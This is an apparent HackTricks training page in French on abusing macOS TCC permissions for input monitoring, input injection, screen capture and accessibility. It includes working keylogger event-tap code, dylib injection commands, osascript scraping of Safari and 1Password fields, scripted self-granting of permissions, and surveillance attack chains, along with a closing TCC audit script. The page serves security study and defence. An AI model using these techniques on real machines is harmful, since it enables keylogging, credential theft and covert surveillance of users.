# macOS Surveillance des entrées, capture d'écran et abus d'accessibilité

{{#include ../../../banners/hacktricks-training.md}}

## Aperçu

Trois services TCC liés contrôlent la façon dont les applications peuvent observer et interagir avec la session de bureau de l'utilisateur :

| TCC Service | Autorisation | Capacité |
|---|---|---|
| `kTCCServiceListenEvent` | **Surveillance des entrées** | Lire tous les événements clavier et souris au niveau système (keylogging) |
| `kTCCServicePostEvent` | **Injection d'entrée** | Injecter des événements clavier et souris synthétiques |
| `kTCCServiceScreenCapture` | **Capture d'écran** | Lire le tampon d'affichage, prendre des captures d'écran, enregistrer l'écran |
| `kTCCServiceAccessibility` | **Accessibilité** | Contrôler d'autres applications via l'API AXUIElement, lire les éléments de l'interface utilisateur |

Ces autorisations sont **la combinaison la plus dangereuse** sur macOS — ensemble elles permettent :
- Keylogging complet de chaque frappe (mots de passe, messages, cartes de crédit)
- Enregistrement d'écran de tout le contenu visible
- Injection d'entrée synthétique (cliquer sur des boutons, approuver des dialogues)
- Contrôle complet de l'interface graphique, équivalent à un accès physique

---

## Surveillance des entrées (kTCCServiceListenEvent)

### Comment ça marche

macOS utilise l'**`CGEventTap` API** pour permettre aux processus d'intercepter les événements d'entrée provenant du système d'événements Quartz. Un processus disposant de l'autorisation ListenEvent peut créer un event tap qui reçoit **tous les événements clavier et souris** avant ou après qu'ils n'atteignent l'application cible.
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Trouver les binaires dotés d'entitlements
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Attack: Keylogging via Code Injection

Si un binaire disposant de la permission ListenEvent a également **disabled library validation** ou **allows DYLD environment variables**, un attaquant peut injecter une dylib qui enregistre un CGEventTap:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
Le dylib injecté hérite du grant ListenEvent TCC de la cible et capture toutes les keystrokes.

### Attack: Credential Harvesting

Un keylogger sophistiqué peut corréler les keystrokes avec l'application active :
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Input Injection (kTCCServicePostEvent)

### How It Works

L'autorisation PostEvent permet de créer un event tap avec **`kCGEventTapOptionDefault`** (peut modifier/injecter des événements) au lieu de ListenOnly. Cela permet :
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Attaque : Approbation automatisée des invites TCC

Avec PostEvent, un attaquant peut **simuler un clic sur "Allow"** dans les boîtes de dialogue d'autorisation TCC :
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Capture d'écran (kTCCServiceScreenCapture)

### Comment ça marche

L'autorisation de capture d'écran permet de lire le buffer d'affichage en utilisant :
- **`CGWindowListCreateImage`** — capturer n'importe quelle fenêtre ou tout l'écran
- **`ScreenCaptureKit`** (macOS 12.3+) — API moderne pour le streaming du contenu d'écran
- **`CGDisplayStream`** — capture d'écran accélérée par le matériel
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Trouver des clients de capture d'écran
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Attack: Credential Capture via OCR

Un processus injecté de capture d'écran peut périodiquement capturer des images et utiliser OCR pour extraire des mots de passe :
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> À partir de **macOS Sonoma**, la capture d'écran affiche un **indicateur persistant** dans la barre de menus. Sur les versions plus anciennes, l'enregistrement d'écran pouvait être complètement silencieux. Cependant, une brève capture d'une seule image peut encore passer inaperçue pour les utilisateurs.

### Attaque: Session Recording

Un enregistrement continu de l'écran fournit une relecture complète de la session de l'utilisateur :
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Accessibilité (kTCCServiceAccessibility)

### Comment ça marche

L'accès Accessibilité permet de contrôler d'autres applications via l'**AXUIElement API**. Un processus disposant de cet accès peut :

1. **Lire** n'importe quel élément UI dans n'importe quelle application (champs de texte, étiquettes, boutons, menus)
2. **Cliquer** sur des boutons et interagir avec des contrôles
3. **Saisir** du texte dans n'importe quel champ de texte
4. **Naviguer** dans les menus et les dialogues
5. **Extraire** les données affichées de toute application en cours d'exécution
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Attaque : Self-Granting TCC Permissions

L'abus d'accessibilité le plus dangereux est de **naviguer dans System Settings pour accorder à votre propre malware des autorisations supplémentaires** :
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Attaque : Cross-Application Data Scraping
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Attaque : Actions utilisateur automatisées
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Chaînes d'attaque

### Chaîne: Input Monitoring + Screen Capture = Surveillance complète
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Chaîne : Accessibility + PostEvent = Contrôle à distance complet
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Chaîne : Accessibilité → Auto-autorisation Caméra/Micro → Surveillance
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## Détection & Énumération
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## Références

* [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
* [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
* [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
* [Objective-See — Accessibility Abuse as TCC Bypass](https://objectivesee.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
